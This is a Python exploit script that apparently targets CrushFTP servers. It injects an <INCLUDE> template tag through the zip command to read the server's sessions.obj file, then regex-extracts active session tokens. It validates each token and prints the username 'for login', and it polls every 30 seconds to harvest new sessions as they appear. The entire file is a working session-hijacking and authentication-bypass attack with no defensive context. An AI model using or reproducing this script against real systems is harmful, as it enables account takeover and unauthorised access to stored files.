import requests
import argparse
from time import sleep
import re

def verify(url, token):
    s = requests.Session()
    h = {"Cookie": f"currentAuth={token[-4:]}; CrushAuth={token}", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"}
    d = {"command":"getUserInfo", "path":"%2F", "random":"0.24949370009952042", "c2f":token[-4:]}
    r = s.post(f"{url}/WebInterface/function/", headers=h, data=d)
    if("<user_name>" in r.text):
        username = r.text.split("<user_name>")[1].split("</user_name>")[0]
        print("---------------------- [+] Valid Token : "+token)
        print("---------------------- [+] Username : "+username)
        print("---------------------- You can use that for login")

def get_cookies(url):
    try:
        session= requests.Session()
        session.get(url, verify=False)
        session.cookies.get_dict()
        return session.cookies.get_dict()
    except:
        if(verbose != 0):
            print("[-] connection failed")
        return tmp

def exploit(url,cookies,path):
    try:
        if(verbose != 0):
            print(cookies)
        url= url + "/WebInterface/function/?command=zip&c2f="+cookies['currentAuth']+"&path=<INCLUDE>"+path+"</INCLUDE>&names=*"
        request=requests.get(url,cookies=cookies, verify=False)
        return request.text
    except:
        if(verbose != 0):
            print("[-] connection failed")
        return tmp



if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url",help="URL of the target", required=True)
    parser.add_argument("-v", "--verbose", default=0, help="verbose", required=False)
    args = parser.parse_args()
    url =args.url
    verbose = args.verbose
    path = "sessions.obj"

    pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}_17\d{11}_[a-zA-Z0-9]{30}_[a-zA-Z0-9]{4}' # Define the regex pattern
    pattern2 = r'17\d{11}_[a-zA-Z0-9]{30}' # Define the regex pattern2

    tmp = "" # use for old data of sessions.obj
    new = "" # use for new data of sessions.obj
    content = "" # use for each req.text

    try:
        if (get_cookies(url)['currentAuth'] == None) :
            print("[-] Not vulnerable")
            quit()
    except:
        print("[-] Not vulnerable")
        quit()

    if not url.startswith("http"):
        print("URL should start with http or https")
        quit()

    cookies = get_cookies(url)
    content = exploit(url, cookies, path)
    tmp = content

    matches = set(re.findall(pattern, tmp))
    for i in matches:
        m = re.findall(pattern2, i)[0]
        print(i)
        verify(url, m)
        sleep(2)

    print("[+] Tmp set")
    sleep(30)

    while(True):
        cookies = get_cookies(url)
        content = exploit(url, cookies, path)
    
        if tmp == content:
            if(verbose != 0):
                print("[-] tmp is the same")
        else:
            print("[+] new logs!")
            if(verbose != 0):
                print("============================")
                print(content.split(tmp)[0])
                print("============================")
            new = content.split(tmp)[0]
            tmp = content

            # Find all matches
            matches = set(re.findall(pattern, new))

            # Print the matches
            for i in matches:
                m = re.findall(pattern2, i)[0]
                print(i)
                verify(url, m)
                sleep(2)

        sleep(30)
        print(".", end="")
        